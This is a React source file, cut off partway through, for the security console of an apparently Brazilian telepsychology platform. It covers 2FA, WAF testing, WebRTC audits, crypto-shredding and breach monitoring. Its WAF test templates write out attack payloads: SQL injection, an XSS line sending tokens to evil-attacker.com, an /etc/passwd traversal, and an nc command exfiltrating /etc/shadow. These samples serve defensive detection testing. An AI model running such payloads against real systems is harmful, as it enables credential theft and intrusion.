import React, { useState } from 'react';
import QRCode from 'qrcode';

import { 
  ShieldCheck, 
  Lock, 
  KeyRound, 
  Smartphone, 
  CheckCircle2, 
  AlertCircle, 
  Copy, 
  RefreshCw, 
  Users, 
  FileLock2, 
  FileCheck2,
  ShieldAlert,
  Fingerprint,
  Cpu,
  Zap,
  RotateCcw,
  Unlock,
  Server,
  Bell,
  Send,
  Trash2,
  Plus,
  Activity,
  Play,
  Workflow,
  Database,
  Laptop,
  Key,
  Radio,
  FolderSync,
  Gauge,
  Flame,
  GlobeLock,
  Ban,
  Video,
  Wifi,
  WifiOff,
  Scissors,
  Layers,
  HardDrive,
  EyeOff,
  Award,
  FileSearch,
  Search
} from 'lucide-react';
import { api } from '../services/api';
import type { 
  SafeUser, 
  RateLimitStatusResponse, 
  EncryptedCacheStatsResponse,
  WebhookSubscription,
  WebhookEventType,
  CreateWebhookDTO,
  ReadinessProbeResponse,
  LivenessProbeResponse,
  StartupProbeResponse,
  SyntheticJourneyResult,
  ResilienceCheckResult,
  PasskeyInfoDTO,
  SiemConnector,
  SiemQueueItem,
  SiemProvider,
  SiemQueueResponse,
  KmsSystemStatus,
  KmsKeyMetadata,
  StressTestReport,
  SecurityHardeningOverviewResponse,
  HoneypotProbeRecord,
  WebRtcSessionAuditRecord,
  WafOverviewResponse,
  InspectPayloadResponse,
  NetworkProfilePreset,
  NetworkSimulationReport,
  NetworkResilienceMetrics,
  MediaRecordingManifest,
  CryptoShreddingCertificate,
  MediaStorageMetrics,
  ClinicalSessionRecoverySession,
  SessionRecoveryMetrics,
  SessionStateSnapshot,
  ZkpClinicalDocumentProof,
  ZkpVerificationResult,
  ZkpSystemMetrics,
  CredentialBreachRecord,
  DpoIncidentAlert,
  ThreatIntelligenceMetrics,
  KAnonymityLookupResult,
  ConsentLedgerOverview,
  ConsentReceipt,
  ConsentReceiptResponse,
  DlpAuditOverview,
  DlpInspectionResult
} from '@terapiainfoco/shared';
import { 
  UserRole, 
  KmsKeyStatus, 
  StressScenario, 
  SloStatus, 
  WebRtcVerificationStatus, 
  WebRtcSecurityGrade, 
  WebRtcCipherSuite, 
  WafMode, 
  NetworkProfileType, 
  ClinicalIntelligibilityGrade, 
  AudioCodecType,
  MediaShardStatus,
  MediaRecordingStatus,
  CryptoShreddingMethod,
  ClinicalSessionState,
  DisconnectionCause,
  ZkpProofType,
  ZkpVerificationStatus,
  BreachSeverity,
  IncidentContainmentStatus,
  ConsentScope,
  DlpPolicyMode,
  DlpRiskLevel,
  SteganographyInspectionStatus
} from '@terapiainfoco/shared';

interface SecurityModuleProps {
  currentUser: SafeUser;
  onUserUpdated: (user: SafeUser) => void;
  onSwitchRole: (role: UserRole) => void;
}

export const SecurityModule: React.FC<SecurityModuleProps> = ({
  currentUser,
  onUserUpdated,
  onSwitchRole
}) => {
  // Estados do 2FA
  const [setupStep, setSetupStep] = useState<'idle' | 'scanning' | 'confirmed'>('idle');
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>('');
  const [totpSecret, setTotpSecret] = useState<string>('');
  const [backupCodes, setBackupCodes] = useState<string[]>([]);
  const [verifyCode, setVerifyCode] = useState<string>('');
  const [disablePassword, setDisablePassword] = useState<string>('');
  const [showDisableModal, setShowDisableModal] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);
  const [feedback, setFeedback] = useState<{ type: 'success' | 'error'; message: string } | null>(null);
  const [copiedSecret, setCopiedSecret] = useState<boolean>(false);

  // Estados de Infraestrutura: Rate Limiting & Cache Criptográfico (Opção I)
  const [rateLimitStatus, setRateLimitStatus] = useState<RateLimitStatusResponse | null>(null);
  const [cacheStats, setCacheStats] = useState<EncryptedCacheStatsResponse | null>(null);
  const [resetKeyInput, setResetKeyInput] = useState<string>('');
  const [loadingInfra, setLoadingInfra] = useState<boolean>(false);

  const fetchInfraStatus = async () => {
    try {
      setLoadingInfra(true);
      const [rateLimitData, cacheData] = await Promise.all([
        api.getRateLimitStatus(),
        api.getEncryptedCacheStats()
      ]);
      setRateLimitStatus(rateLimitData);
      setCacheStats(cacheData);
    } catch {
      // Ignora se o perfil não tiver permissão de Admin
    } finally {
      setLoadingInfra(false);
    }
  };

  // Estados de Hardening HTTP & Honeypot Anti-Probe (RFC-001 §4.4, §5.2)
  const [hardeningOverview, setHardeningOverview] = useState<SecurityHardeningOverviewResponse | null>(null);
  const [loadingHardening, setLoadingHardening] = useState<boolean>(false);
  const [unbanModalTarget, setUnbanModalTarget] = useState<HoneypotProbeRecord | null>(null);
  const [unbanReason, setUnbanReason] = useState<string>('');

  const fetchHardeningOverview = async () => {
    try {
      setLoadingHardening(true);
      const data = await api.getSecurityHardeningOverview();
      setHardeningOverview(data);
    } catch {
      // Ignora para não admins
    } finally {
      setLoadingHardening(false);
    }
  };

  const handleUnbanIp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!unbanModalTarget) return;
    try {
      setLoadingHardening(true);
      const res = await api.unbanIpAddress({
        ipAddress: unbanModalTarget.ipAddress,
        reason: unbanReason.trim() || 'Desbloqueio manual via console de segurança'
      });
      setFeedback({ type: 'success', message: res.message });
      setUnbanModalTarget(null);
      setUnbanReason('');
      await fetchHardeningOverview();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao desbloquear IP.' });
    } finally {
      setLoadingHardening(false);
    }
  };

  // Estados de Auditoria WebRTC & Telepsicologia (RFC-001 §3.2, §4.4, §5.2 e CFP 011/2018)
  const [webrtcSessions, setWebrtcSessions] = useState<WebRtcSessionAuditRecord[]>([]);
  const [loadingWebrtc, setLoadingWebrtc] = useState<boolean>(false);
  const [simulatingWebrtc, setSimulatingWebrtc] = useState<boolean>(false);
  const [showSimulateModal, setShowSimulateModal] = useState<boolean>(false);
  const [simPatientId, setSimPatientId] = useState<string>('pat-001');
  const [simCipherSuite, setSimCipherSuite] = useState<string>(WebRtcCipherSuite.SRTP_AEAD_AES_256_GCM);
  const [simDtlsVersion, setSimDtlsVersion] = useState<string>('DTLS 1.3');

  const fetchWebrtcSessions = async () => {
    try {
      setLoadingWebrtc(true);
      const res = await api.getWebRtcSessions();
      setWebrtcSessions(res.sessions || []);
    } catch {
      // Ignora para perfis sem permissão
    } finally {
      setLoadingWebrtc(false);
    }
  };

  const handleSimulateWebrtcAudit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setSimulatingWebrtc(true);
      const randomHexPairs = () => Array.from({ length: 32 }, () => Math.floor(Math.random() * 256).toString(16).padStart(2, '0').toUpperCase()).join(':');
      const therapistFp = `SHA-256 ${randomHexPairs()}`;
      const patientFp = `SHA-256 ${randomHexPairs()}`;

      const initRes = await api.initiateWebRtcSession({
        patientId: simPatientId,
        therapistFingerprint: therapistFp,
        cipherSuite: simCipherSuite,
        dtlsVersion: simDtlsVersion
      });

      await api.recordWebRtcMetrics({
        sessionId: initRes.session.sessionId,
        jitterMs: Math.round(Math.random() * 15 + 5),
        packetLoss: Math.round(Math.random() * 0.5 * 10) / 10,
        rttMs: Math.round(Math.random() * 40 + 20),
        bytesSent: 340000,
        bytesReceived: 412000,
        cipherSuite: simCipherSuite
      });

      const verifyRes = await api.verifyWebRtcFingerprint({
        sessionId: initRes.session.sessionId,
        patientFingerprint: patientFp,
        manuallyConfirmedByUser: true
      });

      setFeedback({
        type: 'success',
        message: `Sessão WebRTC ${initRes.session.sessionId.slice(0, 12)}... auditada com sucesso! Safety Numbers: ${verifyRes.safetyNumbers}`
      });
      setShowSimulateModal(false);
      await fetchWebrtcSessions();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao simular auditoria de canal WebRTC.'
      });
    } finally {
      setSimulatingWebrtc(false);
    }
  };

  const handleTerminateWebrtcSession = async (sessionId: string) => {
    try {
      setLoadingWebrtc(true);
      const res = await api.terminateWebRtcSession({
        sessionId,
        finalNotes: 'Atendimento telepsicológico finalizado e selado pelo psicólogo na console de segurança.'
      });
      setFeedback({
        type: 'success',
        message: `Sessão ${sessionId.slice(0, 12)}... finalizada com selo probatório ${res.session.tamperEvidentSeal}`
      });
      await fetchWebrtcSessions();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao finalizar sessão WebRTC.'
      });
    } finally {
      setLoadingWebrtc(false);
    }
  };

  // Estados do WAF em Camada de Aplicação (RFC-001 §4.4, §5.2 e OWASP Top 10)
  const [wafOverview, setWafOverview] = useState<WafOverviewResponse | null>(null);
  const [loadingWaf, setLoadingWaf] = useState<boolean>(false);
  const [updatingWafMode, setUpdatingWafMode] = useState<boolean>(false);
  const [testPayloadInput, setTestPayloadInput] = useState<string>("' OR '1'='1' -- UNION SELECT id, name, cpf FROM patients");
  const [testPayloadContext, setTestPayloadContext] = useState<string>('prontuario-soap');
  const [inspectingPayload, setInspectingPayload] = useState<boolean>(false);
  const [inspectionResult, setInspectionResult] = useState<InspectPayloadResponse | null>(null);

  const fetchWafOverview = async () => {
    try {
      setLoadingWaf(true);
      const res = await api.getWafOverview();
      setWafOverview(res);
    } catch {
      // Ignora para perfis sem permissão
    } finally {
      setLoadingWaf(false);
    }
  };

  const handleUpdateWafMode = async (mode: WafMode) => {
    try {
      setUpdatingWafMode(true);
      const res = await api.updateWafMode({
        mode,
        blockThreshold: 50
      });
      setFeedback({
        type: 'success',
        message: res.message
      });
      await fetchWafOverview();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao atualizar o modo operacional do WAF.'
      });
    } finally {
      setUpdatingWafMode(false);
    }
  };

  const handleInspectWafPayload = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!testPayloadInput.trim()) return;
    try {
      setInspectingPayload(true);
      const res = await api.inspectWafPayload({
        payload: testPayloadInput,
        context: testPayloadContext
      });
      setInspectionResult(res);
      if (!res.inspection.passed) {
        setFeedback({
          type: 'error',
          message: `Ameaça detectada no payload! Threat Score: ${res.threatScore}/100 (${res.blocked ? 'Bloqueio Imediato 403' : 'Monitoramento'}). Regras: ${res.inspection.matchedRules.map(r => r.ruleId).join(', ')}`
        });
      } else {
        setFeedback({
          type: 'success',
          message: `Payload analisado com sucesso! Threat Score: ${res.threatScore}/100. Nenhuma heurística maliciosa detectada.`
        });
      }
      await fetchWafOverview();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao inspecionar payload via WAF.'
      });
    } finally {
      setInspectingPayload(false);
    }
  };

  const applyWafTemplate = (type: 'sqli' | 'xss' | 'lfi' | 'cmd' | 'clean') => {
    switch (type) {
      case 'sqli':
        setTestPayloadInput("' OR '1'='1' -- UNION SELECT id, name, cpf, encrypted_deks FROM patients WHERE '1'='1'");
        break;
      case 'xss':
        setTestPayloadInput("<script>fetch('https://evil-attacker.com/steal?token=' + localStorage.getItem('token'))</script>");
        break;
      case 'lfi':
        setTestPayloadInput("../../../../../etc/passwd%00/secret_keys.pem");
        break;
      case 'cmd':
        setTestPayloadInput("; cat /etc/shadow | nc 198.51.100.22 4444 &");
        break;
      case 'clean':
        setTestPayloadInput("Paciente relata redução significativa das crises de ansiedade após início dos exercícios de respiração diafragmática. Sono preservado.");
        break;
    }
  };

  // Estados do Simulador de Resiliência de Redes & Inteligibilidade Clínica (ITU-T G.107 & CFP 011/2018)
  const [resiliencePresets, setResiliencePresets] = useState<NetworkProfilePreset[]>([]);
  const [resilienceHistory, setResilienceHistory] = useState<NetworkSimulationReport[]>([]);
  const [resilienceMetrics, setResilienceMetrics] = useState<NetworkResilienceMetrics | null>(null);
  const [loadingResilience, setLoadingResilience] = useState<boolean>(false);
  const [simulatingResilience, setSimulatingResilience] = useState<boolean>(false);

  // Parâmetros de simulação selecionados
  const [simProfileType, setSimProfileType] = useState<NetworkProfileType>(NetworkProfileType.WIFI_OSCILANTE);
  const [simPacketLoss, setSimPacketLoss] = useState<number>(3.5);
  const [simJitterMs, setSimJitterMs] = useState<number>(45);
  const [simRttMs, setSimRttMs] = useState<number>(85);
  const [simBandwidthKbps, setSimBandwidthKbps] = useState<number>(12000);
  const [simCodec, setSimCodec] = useState<AudioCodecType>(AudioCodecType.OPUS_FULLBAND);
  const [simDurationSeconds] = useState<number>(60);
  const [simAudioOnly, setSimAudioOnly] = useState<boolean>(false);
  const [simSessionId, setSimSessionId] = useState<string>('sess-teleconsulta-demo');
  const [latestSimulationReport, setLatestSimulationReport] = useState<NetworkSimulationReport | null>(null);

  const fetchNetworkResilienceData = async () => {
    try {
      setLoadingResilience(true);
      const [presetsRes, historyRes, metricsRes] = await Promise.all([
        api.getNetworkResiliencePresets(),
        api.getNetworkResilienceHistory(),
        api.getNetworkResilienceMetrics()
      ]);
      setResiliencePresets(presetsRes.presets);
      setResilienceHistory(historyRes.reports);
      setResilienceMetrics(metricsRes.metrics);
      if (!latestSimulationReport && historyRes.reports.length > 0) {
        setLatestSimulationReport(historyRes.reports[0]);
      }
    } catch {
      // Ignora se perfil não tiver permissão
    } finally {
      setLoadingResilience(false);
    }
  };

  const handleSelectResiliencePreset = (preset: NetworkProfilePreset) => {
    setSimProfileType(preset.profile);
    setSimPacketLoss(preset.defaultParams.packetLossPercent);
    setSimJitterMs(preset.defaultParams.jitterMs);
    setSimRttMs(preset.defaultParams.rttMs);
    setSimBandwidthKbps(preset.defaultParams.bandwidthKbps);
    setSimCodec(preset.defaultParams.codec);
    setSimAudioOnly(!!preset.defaultParams.simulateAudioOnly);
  };

  const handleRunNetworkSimulation = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    try {
      setSimulatingResilience(true);
      const res = await api.runNetworkSimulation({
        profile: simProfileType,
        params: {
          packetLossPercent: Number(simPacketLoss),
          jitterMs: Number(simJitterMs),
          rttMs: Number(simRttMs),
          bandwidthKbps: Number(simBandwidthKbps),
          codec: simCodec,
          durationSeconds: Number(simDurationSeconds),
          simulateAudioOnly: simAudioOnly
        },
        patientId: simSessionId.trim() || undefined
      });
      setLatestSimulationReport(res.report);
      setFeedback({
        type: res.report.assessment.requiresContingency ? 'error' : 'success',
        message: res.message
      });
      await fetchNetworkResilienceData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao executar simulação de resiliência de rede.'
      });
    } finally {
      setSimulatingResilience(false);
    }
  };

  // Estados de Sharding de Mídia & Destruição Programada / Crypto-Shredding (RFC-001 §3.2, §3.3, §4.2 e CFP 011/2018)
  const [mediaRecordings, setMediaRecordings] = useState<MediaRecordingManifest[]>([]);
  const [mediaStorageMetrics, setMediaStorageMetrics] = useState<MediaStorageMetrics | null>(null);
  const [loadingMediaStorage, setLoadingMediaStorage] = useState<boolean>(false);
  const [simulatingMediaSharding, setSimulatingMediaSharding] = useState<boolean>(false);
  const [shreddingMediaId, setShreddingMediaId] = useState<string | null>(null);
  const [selectedRecording, setSelectedRecording] = useState<MediaRecordingManifest | null>(null);
  const [selectedCertificate, setSelectedCertificate] = useState<CryptoShreddingCertificate | null>(null);
  const [showCertificateModal, setShowCertificateModal] = useState<boolean>(false);
  const [newMediaSessionId, setNewMediaSessionId] = useState<string>('sess-telepsico-demo');
  const [newMediaShardsCount, setNewMediaShardsCount] = useState<number>(4);
  const [newMediaCodec, setNewMediaCodec] = useState<AudioCodecType>(AudioCodecType.OPUS_FULLBAND);

  const fetchMediaStorageData = async () => {
    try {
      setLoadingMediaStorage(true);
      const res = await api.getMediaRecordings();
      setMediaRecordings(res.recordings);
      setMediaStorageMetrics(res.metrics);
      if (!selectedRecording && res.recordings.length > 0) {
        setSelectedRecording(res.recordings[0]);
      }
    } catch {
      // Ignora para perfis sem permissão
    } finally {
      setLoadingMediaStorage(false);
    }
  };

  const handleSimulateMediaRecording = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    try {
      setSimulatingMediaSharding(true);
      // 1. Cria a sessão de gravação com sharding
      const created = await api.createMediaRecording({
        sessionId: newMediaSessionId.trim() || `sess-${Date.now().toString(36)}`,
        codec: newMediaCodec,
        estimatedDurationSeconds: 50
      });

      // 2. Faz o upload particionado de N chunks
      const sampleFragments = [
        'Início do atendimento clínico: Acolhimento e verificação de sigilo.',
        'Paciente relata quadro de ansiedade generalizada e insônia.',
        'Exploração de gatilhos ocupacionais e padrão cognitivo disfuncional.',
        'Exercício de reestruturação cognitiva e respiração guiada.',
        'Pactuação de tarefas entre sessões e encerramento da consulta.'
      ];

      const count = Math.max(1, Math.min(newMediaShardsCount, 8));
      for (let i = 0; i < count; i++) {
        const text = sampleFragments[i % sampleFragments.length];
        const audioDataBase64 = btoa(unescape(encodeURIComponent(text)));
        await api.uploadMediaChunk(created.recording.id, {
          chunkIndex: i,
          audioDataBase64
        });
      }

      // 3. Finaliza a gravação, calcula a Merkle Root e sela no ledger WORM
      const finalized = await api.finalizeMediaRecording(created.recording.id);
      setSelectedRecording(finalized.recording);
      setFeedback({
        type: 'success',
        message: `Gravação ${finalized.recording.id.slice(0, 8)} criada com ${count} shards cifrados com DEK efêmera e selada no WORM!`
      });
      await fetchMediaStorageData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao simular gravação com sharding.'
      });
    } finally {
      setSimulatingMediaSharding(false);
    }
  };

  const handleSimulatePipeline = async (recordingId: string, autoShred: boolean = true) => {
    try {
      setShreddingMediaId(recordingId);
      const res = await api.simulateMediaPipeline(recordingId, autoShred);
      setSelectedRecording(res.recording);
      if (res.certificate) {
        setSelectedCertificate(res.certificate);
        setShowCertificateModal(true);
      }
      setFeedback({
        type: 'success',
        message: res.message
      });
      await fetchMediaStorageData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha no pipeline de transcrição/expurgamento.'
      });
    } finally {
      setShreddingMediaId(null);
    }
  };

  const handleExecuteCryptoShredding = async (recordingId: string) => {
    try {
      setShreddingMediaId(recordingId);
      const res = await api.executeCryptoShredding(recordingId, {
        recordingId,
        method: CryptoShreddingMethod.ZERO_FILL_AND_KEY_DESTROY,
        reason: 'Expurgamento compulsório pós-sessão conforme CFP nº 011/2018 e LGPD Art. 16'
      });
      setSelectedCertificate(res.certificate);
      setShowCertificateModal(true);
      setFeedback({
        type: 'success',
        message: res.message
      });
      await fetchMediaStorageData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao executar Crypto-Shredding.'
      });
    } finally {
      setShreddingMediaId(null);
    }
  };

  const handleViewCertificate = async (recordingId: string) => {
    try {
      const res = await api.getMediaRecordingCertificate(recordingId);
      setSelectedCertificate(res.certificate);
      setShowCertificateModal(true);
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Certificado ainda não gerado para esta gravação.'
      });
    }
  };

  // Estados de Detector de Desconexão Abrupta & Protocolo de Reconexão Segura (RFC-001 §3.2 & CFP 011/2018)
  const [recoverySessions, setRecoverySessions] = useState<ClinicalSessionRecoverySession[]>([]);
  const [recoveryMetrics, setRecoveryMetrics] = useState<SessionRecoveryMetrics | null>(null);
  const [loadingRecovery, setLoadingRecovery] = useState<boolean>(false);
  const [activeRecoverySession, setActiveRecoverySession] = useState<ClinicalSessionRecoverySession | null>(null);
  const [clientReconnectionToken, setClientReconnectionToken] = useState<string>('');
  const [recoveryNotesInput, setRecoveryNotesInput] = useState<string>('Paciente expõe melhora dos sintomas de ansiedade e pactua técnica de respiração diafragmática.');
  const [recoverySessionIdInput, setRecoverySessionIdInput] = useState<string>('sess-telepsico-demo');
  const [restoredSnapshotData, setRestoredSnapshotData] = useState<SessionStateSnapshot | null>(null);
  const [actionInProgress, setActionInProgress] = useState<boolean>(false);

  const fetchSessionRecoveryData = async () => {
    try {
      setLoadingRecovery(true);
      const res = await api.getClinicalSessionsRecoveryList();
      setRecoverySessions(res.sessions || []);
      setRecoveryMetrics(res.metrics || null);
    } catch (err: any) {
      console.error('Erro ao carregar sessões e métricas de reconexão:', err);
    } finally {
      setLoadingRecovery(false);
    }
  };

  const handleStartRecoverySession = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    try {
      setActionInProgress(true);
      const sid = recoverySessionIdInput.trim() || `sess-${Date.now().toString(36)}`;
      const res = await api.startClinicalSessionMonitoring({
        sessionId: sid,
        appointmentId: `apt-${Date.now().toString(36)}`,
        gracePeriodSeconds: 600,
        initialSnapshot: {
          elapsedSeconds: 0,
          clinicalNotesDraft: recoveryNotesInput,
          soapSubjectiveDraft: 'Paciente relata sensação de estabilidade emocional.'
        }
      });
      setActiveRecoverySession(res.session);
      setClientReconnectionToken(res.reconnectionToken || '');
      setRestoredSnapshotData(null);
      setFeedback({
        type: 'success',
        message: `Sessão ${sid} iniciada com monitoramento contínuo e token HMAC ativo!`
      });
      await fetchSessionRecoveryData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao iniciar sessão clínica.'
      });
    } finally {
      setActionInProgress(false);
    }
  };

  const handleSendRecoveryHeartbeat = async () => {
    if (!activeRecoverySession) return;
    try {
      setActionInProgress(true);
      const res = await api.sendSessionHeartbeat({
        sessionId: activeRecoverySession.sessionId,
        snapshot: {
          elapsedSeconds: (activeRecoverySession.heartbeatCount * 30),
          clinicalNotesDraft: recoveryNotesInput
        }
      });
      setActiveRecoverySession(res.session);
      setFeedback({
        type: 'success',
        message: `Heartbeat #${res.session.heartbeatCount} enviado. Snapshot incremental cifrado com AES-256-GCM!`
      });
      await fetchSessionRecoveryData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao enviar heartbeat.'
      });
    } finally {
      setActionInProgress(false);
    }
  };

  const handleTriggerDisconnection = async (cause = DisconnectionCause.SOCKET_DROP) => {
    if (!activeRecoverySession) return;
    try {
      setActionInProgress(true);
      const res = await api.triggerSessionDisconnection({
        sessionId: activeRecoverySession.sessionId,
        cause,
        detail: 'Simulação de oscilação severa de rede / interrupção de socket'
      });
      setActiveRecoverySession(res.session);
      if (res.reconnectionToken) {
        setClientReconnectionToken(res.reconnectionToken);
      }
      setFeedback({
        type: 'success',
        message: 'Desconexão abrupta simulada! Janela ética de tolerância (10 min) acionada conforme CFP nº 011/2018.'
      });
      await fetchSessionRecoveryData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao simular desconexão.'
      });
    } finally {
      setActionInProgress(false);
    }
  };

  const handleAttemptSessionReconnect = async () => {
    if (!activeRecoverySession || !clientReconnectionToken) return;
    try {
      setActionInProgress(true);
      const res = await api.attemptSessionReconnect({
        sessionId: activeRecoverySession.sessionId,
        reconnectionToken: clientReconnectionToken
      });
      setActiveRecoverySession(res.session);
      if (res.restoredSnapshot) {
        setRestoredSnapshotData(res.restoredSnapshot);
        setRecoveryNotesInput(res.restoredSnapshot.clinicalNotesDraft);
      }
      setFeedback({
        type: 'success',
        message: res.message
      });
      await fetchSessionRecoveryData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha na reconexão da sessão clínica.'
      });
    } finally {
      setActionInProgress(false);
    }
  };

  const handleCompleteSession = async () => {
    if (!activeRecoverySession) return;
    try {
      setActionInProgress(true);
      const res = await api.completeClinicalSession({
        sessionId: activeRecoverySession.sessionId,
        finalNotes: recoveryNotesInput
      });
      setActiveRecoverySession(res.session);
      setFeedback({
        type: 'success',
        message: res.message
      });
      await fetchSessionRecoveryData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao concluir sessão.'
      });
    } finally {
      setActionInProgress(false);
    }
  };

  // Estados de Validação Forense de Assinaturas com ZKP (Zero-Knowledge Proofs - RFC-001 §3.4, §3.5 & CFP 006/2019)
  const [zkpProofs, setZkpProofs] = useState<ZkpClinicalDocumentProof[]>([]);
  const [zkpMetrics, setZkpMetrics] = useState<ZkpSystemMetrics | null>(null);
  const [loadingZkp, setLoadingZkp] = useState<boolean>(false);
  const [zkpDocIdInput, setZkpDocIdInput] = useState<string>('doc-laudo-cfp-001');
  const [zkpDocTypeInput, setZkpDocTypeInput] = useState<string>('Laudo Psicológico');
  const [zkpDocumentTextInput, setZkpDocumentTextInput] = useState<string>('Atesto que o paciente compareceu às sessões psicoterapêuticas semanais para avaliação pericial.');
  const [zkpTherapistCrpInput, setZkpTherapistCrpInput] = useState<string>('06/123456');
  const [zkpTokenInput, setZkpTokenInput] = useState<string>('');
  const [zkpVerificationResult, setZkpVerificationResult] = useState<ZkpVerificationResult | null>(null);
  const [generatingZkp, setGeneratingZkp] = useState<boolean>(false);
  const [verifyingZkp, setVerifyingZkp] = useState<boolean>(false);

  const fetchZkpData = async () => {
    try {
      setLoadingZkp(true);
      const res = await api.getZkpProofs();
      setZkpProofs(res.proofs || []);
      setZkpMetrics(res.metrics || null);
    } catch (err: any) {
      console.error('Erro ao carregar provas ZKP:', err);
    } finally {
      setLoadingZkp(false);
    }
  };

  const handleGenerateZkpProof = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    try {
      setGeneratingZkp(true);
      const res = await api.generateZkpProof({
        documentId: zkpDocIdInput.trim() || `doc-${Date.now().toString(36)}`,
        documentTypeClaim: zkpDocTypeInput.trim() || 'Laudo Psicológico',
        documentIssuedAt: new Date().toISOString()
      });
      setZkpTokenInput(res.proof.publicVerificationToken);
      setFeedback({
        type: 'success',
        message: 'Prova Schnorr NIZK gerada com sucesso! Token público pronto para verificação forense.'
      });
      await fetchZkpData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao gerar prova de conhecimento zero (ZKP).'
      });
    } finally {
      setGeneratingZkp(false);
    }
  };

  const handleVerifyZkpProof = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!zkpTokenInput.trim()) {
      setFeedback({
        type: 'error',
        message: 'Por favor, informe ou cole o token público ZKP.'
      });
      return;
    }
    try {
      setVerifyingZkp(true);
      const res = await api.verifyZkpProof({
        publicVerificationToken: zkpTokenInput.trim()
      });
      setZkpVerificationResult(res.result);
      if (res.result.valid) {
        setFeedback({
          type: 'success',
          message: 'Prova ZKP válida! Autoria e integridade verificadas sem qualquer vazamento de texto clínico.'
        });
      } else {
        setFeedback({
          type: 'error',
          message: `Falha na verificação ZKP: ${res.result.message}`
        });
      }
      await fetchZkpData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao verificar prova ZKP.'
      });
    } finally {
      setVerifyingZkp(false);
    }
  };

  // Estados de Threat Intelligence & Monitor de Vazamento na Dark Web (RFC-001 §4.4, LGPD Art. 46/48)
  const [threatIncidents, setThreatIncidents] = useState<CredentialBreachRecord[]>([]);
  const [dpoAlerts, setDpoAlerts] = useState<DpoIncidentAlert[]>([]);
  const [threatMetrics, setThreatMetrics] = useState<ThreatIntelligenceMetrics | null>(null);
  const [loadingThreatIntel, setLoadingThreatIntel] = useState<boolean>(false);
  const [kAnonInput, setKAnonInput] = useState<string>('admin123');
  const [kAnonResult, setKAnonResult] = useState<KAnonymityLookupResult | null>(null);
  const [checkingKAnon, setCheckingKAnon] = useState<boolean>(false);
  const [scanningDarkWeb, setScanningDarkWeb] = useState<boolean>(false);
  const [containingIncidentId, setContainingIncidentId] = useState<string | null>(null);
  const [resolvingIncident, setResolvingIncident] = useState<CredentialBreachRecord | null>(null);
  const [resolutionNotesInput, setResolutionNotesInput] = useState<string>('Credencial redefinida com sucesso; 2FA com Passkey validado; sem exfiltração de prontuário.');
  const [reportedToAnpdInput, setReportedToAnpdInput] = useState<boolean>(true);
  const [anpdProtocolInput, setAnpdProtocolInput] = useState<string>('ANPD-2026-INC-89412');

  const fetchThreatIntelligenceData = async () => {
    try {
      setLoadingThreatIntel(true);
      const res = await api.getThreatIntelligenceOverview();
      setThreatIncidents(res.incidents || []);
      setDpoAlerts(res.alerts || []);
      setThreatMetrics(res.metrics || null);
    } catch (err: any) {
      console.error('Erro ao carregar dados de Threat Intelligence:', err);
    } finally {
      setLoadingThreatIntel(false);
    }
  };

  const handleCheckKAnonymity = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!kAnonInput.trim()) return;
    try {
      setCheckingKAnon(true);
      const res = await api.checkCredentialBreach({ passwordSample: kAnonInput.trim() });
      setKAnonResult(res.result);
      setFeedback({
        type: res.result.matched ? 'error' : 'success',
        message: res.message
      });
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao consultar k-Anonymity.'
      });
    } finally {
      setCheckingKAnon(false);
    }
  };

  const handleTriggerDarkWebScan = async () => {
    try {
      setScanningDarkWeb(true);
      const res = await api.triggerDarkWebScan({ scope: 'ALL_STAFF', simulateBreachDump: true });
      setFeedback({
        type: res.newIncidentsCount > 0 ? 'error' : 'success',
        message: res.message
      });
      await fetchThreatIntelligenceData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao executar varredura na Dark Web.'
      });
    } finally {
      setScanningDarkWeb(false);
    }
  };

  const handleContainIncident = async (incidentId: string) => {
    try {
      setContainingIncidentId(incidentId);
      const res = await api.containIncident({
        incidentId,
        reason: 'Revogação emergencial compulsória de sessões conforme LGPD Art. 46',
        forcePasswordReset: true
      });
      setFeedback({
        type: 'success',
        message: res.message
      });
      await fetchThreatIntelligenceData();
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao conter incidente.'
      });
    } finally {
      setContainingIncidentId(null);
    }
  };

  const handleResolveIncident = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!resolvingIncident) return;
    try {
      const res = await api.resolveIncident({
        incidentId: resolvingIncident.id,
        resolutionNotes: resolutionNotesInput,
        reportedToAnpd: reportedToAnpdInput,
        anpdProtocolNumber: reportedToAnpdInput ? anpdProtocolInput : undefined
      });
      setFeedback({
        type: 'success',
        message: res.message
      });
      setResolvingIncident(null);
      await fetchThreatIntelligenceData();
